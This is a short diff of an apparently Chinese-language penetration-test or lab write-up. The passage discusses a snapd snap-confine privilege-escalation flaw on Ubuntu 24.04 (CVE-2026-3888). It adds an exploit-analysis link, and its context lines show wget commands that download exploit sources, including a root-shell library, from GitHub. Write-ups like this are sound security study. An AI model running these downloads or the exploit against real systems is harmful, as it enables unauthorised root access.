@@ -341,6 +341,7 @@ drwxr-xr-x  4 jonathan jonathan 4096 Mar 20 11:38 snapd-desktop-integration
 ```
 #### 我们在谷歌上搜索了有关最新 snapd 漏洞的信息，发现 Quayls 发布了这样的声明：所有版本（包括 2.74.2 之前的所有版本）都存在针对默认 Ubuntu 图形用户界面安装的攻击漏洞。目标所使用的 Ubuntu 24.04 系统中，snap-confine 是一个 SUID-root 二进制文件，它会在任何 snap 运行之前构建沙盒环境。而在 Ubuntu 25.10 及更高版本中，snap-confine 则具有相应的权限。这种设置的一部分内容包括创建模拟文件，即可写入的只读文件系统目录的副本。
 -----------------------------------------------------------------------------------------
+https://github.com/nomaisthere/CVE-2026-3888/blob/main/analysis/04-exploitation-steps.md
 ```
 [★]$ wget https://raw.githubusercontent.com/nomaisthere/CVE-2026-3888/refs/heads/main/src/firefox_2404.c
 [★]$ wget https://raw.githubusercontent.com/nomaisthere/CVE-2026-3888/refs/heads/main/src/librootshell.c
